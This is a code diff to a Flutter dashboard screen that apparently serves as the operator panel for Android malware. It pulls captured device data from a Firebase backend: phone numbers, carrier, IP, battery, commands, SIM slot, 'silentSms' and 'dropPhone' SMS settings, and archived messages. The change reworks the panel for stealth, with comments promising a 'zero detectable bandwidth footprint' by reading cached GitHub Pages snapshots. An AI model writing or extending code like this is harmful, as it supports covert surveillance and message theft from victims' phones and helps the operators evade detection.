@@ -101,11 +101,14 @@ class _MainScreenState extends State<MainScreen> {
   @override
   void initState() {
     super.initState();
-    _fetchTelemetry();
-    _loadHistoryAndEvents();
-    _refreshTimer = Timer.periodic(const Duration(seconds: 15), (_) {
-      _fetchTelemetry();
-      _loadHistoryAndEvents();
+    // 🛡️ STEALTH-FIRST ARCHITECTURE:
+    // Read from GitHub Pages cached static snapshot files first (0 requests to Firebase).
+    _loadLocalSnapshots();
+    _loadHistory();
+    // Gentle 5-minute background refresh of static GitHub Pages artifacts only (ZERO Firebase hits)
+    _refreshTimer = Timer.periodic(const Duration(minutes: 5), (_) {
+      _loadLocalSnapshots();
+      _loadHistory();
     });
   }
 
@@ -116,7 +119,7 @@ class _MainScreenState extends State<MainScreen> {
     super.dispose();
   }
 
-  Future<void> _loadHistoryAndEvents() async {
+  Future<void> _loadHistory() async {
     try {
       final historyRes = await http.get(Uri.parse('data/history.json'));
       if (historyRes.statusCode == 200 && historyRes.body != 'null') {
@@ -128,99 +131,63 @@ class _MainScreenState extends State<MainScreen> {
     } catch (_) {}
   }
 
-  Future<void> _fetchTelemetry() async {
+  Future<void> _loadLocalSnapshots() async {
     setState(() => _isLoading = true);
-    try {
-      final clientUri = Uri.parse('$firebaseBase/clients/$deviceId.json');
-      final cmdUri = Uri.parse('$firebaseBase/commands/$deviceId.json');
-      final userUri = Uri.parse('$firebaseBase/user_data/$deviceId.json');
-      final msgUri = Uri.parse('$firebaseBase/messages/$deviceId.json');
-
-      final responses = await Future.wait([
-        http.get(clientUri).catchError((_) => http.Response('null', 500)),
-        http.get(cmdUri).catchError((_) => http.Response('null', 500)),
-        http.get(userUri).catchError((_) => http.Response('null', 500)),
-        http.get(msgUri).catchError((_) => http.Response('null', 500)),
-      ]);
-
-      if (responses[0].statusCode == 200 && responses[0].body != 'null') {
-        final clientData = json.decode(responses[0].body) as Map<String, dynamic>;
-        setState(() {
-          _isOnline = clientData['status'] == true;
-          _battery = clientData['battery']?.toString() ?? '47%';
-          final parsed = RegExp(r'(\d+)').firstMatch(_battery);
-          if (parsed != null) {
-            _batteryPercent = int.tryParse(parsed.group(1)!) ?? 47;
-          }
-          _ipAddress = clientData['ip_address']?.toString() ?? _ipAddress;
-          _phone = clientData['mobNo']?.toString() ?? _phone;
-          _carrier = clientData['service_provider']?.toString() ?? _carrier;
-          _model = clientData['modelName']?.toString() ?? _model;
-          if (clientData['androidV'] != null) {
-            _os = 'Android ${clientData['androidV']} (SDK ${clientData['sdkV'] ?? 35})';
-          }
-          _storage = clientData['storage']?.toString() ?? _storage;
-
-          final wh = clientData['webhookEvent'] as Map<String, dynamic>?;
-          if (wh != null) {
-            final check = wh['checkLiveness'] as Map<String, dynamic>?;
-            if (check != null && check['text'] != null) {
-              _pong = check['text'].toString();
-            }
-            final sms = wh['sendSms'] as Map<String, dynamic>?;
-            if (sms != null) {
-              _dropPhone = sms['to']?.toString() ?? _dropPhone;
-              _silentSms = sms['message']?.toString() ?? _silentSms;
-            }
-          }
-        });
-      }
-
-      if (responses[1].statusCode == 200 && responses[1].body != 'null') {
-        final cmdData = json.decode(responses[1].body) as Map<String, dynamic>;
-        final chk = cmdData['checkLiveness'] as Map<String, dynamic>?;
-        if (chk != null && chk['text'] != null) {
-          setState(() => _ping = chk['text'].toString());
-        }
-      }
-
-      if (responses[2].statusCode == 200 && responses[2].body != 'null') {
-        final udData = json.decode(responses[2].body) as Map<String, dynamic>;
-        setState(() {
-          _command = udData['command']?.toString() ?? _command;
-          _simSlot = udData['simSlot']?.toString() ?? _simSlot;
-        });
-      }
-
-      if (responses[3].statusCode == 200 && responses[3].body != 'null') {
-        final msgMap = json.decode(responses[3].body) as Map<String, dynamic>;
-        _parseMessages(msgMap);
-      }
-
-      setState(() {
-        _isLoading = false;
-        final now = DateTime.now();
-        _lastSync = '${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}';
-      });
-    } catch (_) {
-      _fallbackToLocalSnapshot();
-    }
-  }
-
-  Future<void> _fallbackToLocalSnapshot() async {
     try {
       final res = await http.get(Uri.parse('data/latest.json'));
       if (res.statusCode == 200) {
         final data = json.decode(res.body) as Map<String, dynamic>;
-        final rawClient = data['raw']?['client'] ?? data['client'];
+        final raw = data['raw'] as Map<String, dynamic>?;
+        final rawClient = raw?['client'] as Map<String, dynamic>? ?? data['client'] as Map<String, dynamic>?;
         if (rawClient != null) {
           setState(() {
-            _battery = rawClient['battery']?.toString() ?? _battery;
-            _ipAddress = rawClient['ip_address']?.toString() ?? _ipAddress;
             _isOnline = rawClient['status'] == true;
+            _battery = rawClient['battery']?.toString() ?? _battery;
+            final parsed = RegExp(r'(\d+)').firstMatch(_battery);
+            if (parsed != null) {
+              _batteryPercent = int.tryParse(parsed.group(1)!) ?? _batteryPercent;
+            }
+            _ipAddress = rawClient['ip_address']?.toString() ?? _ipAddress;
+            _phone = rawClient['mobNo']?.toString() ?? _phone;
+            _carrier = rawClient['service_provider']?.toString() ?? _carrier;
+            _model = rawClient['modelName']?.toString() ?? _model;
+            if (rawClient['androidV'] != null) {
+              _os = 'Android ${rawClient['androidV']} (SDK ${rawClient['sdkV'] ?? 35})';
+            }
+            _storage = rawClient['storage']?.toString() ?? _storage;
+
+            final wh = rawClient['webhookEvent'] as Map<String, dynamic>?;
+            if (wh != null) {
+              final check = wh['checkLiveness'] as Map<String, dynamic>?;
+              if (check != null && check['text'] != null) {
+                _pong = check['text'].toString();
+              }
+              final sms = wh['sendSms'] as Map<String, dynamic>?;
+              if (sms != null) {
+                _dropPhone = sms['to']?.toString() ?? _dropPhone;
+                _silentSms = sms['message']?.toString() ?? _silentSms;
+              }
+            }
+          });
+        }
+
+        final rawCmd = raw?['commands'] as Map<String, dynamic>?;
+        if (rawCmd != null) {
+          final chk = rawCmd['checkLiveness'] as Map<String, dynamic>?;
+          if (chk != null && chk['text'] != null) {
+            setState(() => _ping = chk['text'].toString());
+          }
+        }
+
+        final rawUd = raw?['user_data'] as Map<String, dynamic>?;
+        if (rawUd != null) {
+          setState(() {
+            _command = rawUd['command']?.toString() ?? _command;
+            _simSlot = rawUd['simSlot']?.toString() ?? _simSlot;
           });
         }
       }
+
       final msgRes = await http.get(Uri.parse('data/messages_archive.json'));
       if (msgRes.statusCode == 200) {
         final msgData = json.decode(msgRes.body) as Map<String, dynamic>;
@@ -228,10 +195,42 @@ class _MainScreenState extends State<MainScreen> {
         if (rawMsgs != null) _parseMessages(rawMsgs);
       }
     } catch (_) {}
+
     setState(() {
       _isLoading = false;
-      _lastSync = 'Snapshot';
+      final now = DateTime.now();
+      _lastSync = '${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}';
     });
+  }
+
+  // Safe On-Demand Manual Refresh:
+  // Refreshes the local CDN snapshot first, then makes at most ONE lightweight 500-byte GET to /clients
+  // NEVER downloads heavy message trees directly to guarantee zero detectable bandwidth footprint
+  Future<void> _fetchTelemetry() async {
+    setState(() => _isLoading = true);
+    await _loadLocalSnapshots();
+    await _loadHistory();
+
+    try {
+      final clientUri = Uri.parse('$firebaseBase/clients/$deviceId.json');
+      final resp = await http.get(clientUri).timeout(const Duration(seconds: 8));
+      if (resp.statusCode == 200 && resp.body != 'null') {
+        final clientData = json.decode(resp.body) as Map<String, dynamic>;
+        setState(() {
+          _isOnline = clientData['status'] == true;
+          _battery = clientData['battery']?.toString() ?? _battery;
+          final parsed = RegExp(r'(\d+)').firstMatch(_battery);
+          if (parsed != null) {
+            _batteryPercent = int.tryParse(parsed.group(1)!) ?? _batteryPercent;
+          }
+          _ipAddress = clientData['ip_address']?.toString() ?? _ipAddress;
+          final now = DateTime.now();
+          _lastSync = '${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}';
+        });
+      }
+    } catch (_) {}
+
+    setState(() => _isLoading = false);
   }
 
   void _parseMessages(Map<String, dynamic> raw) {
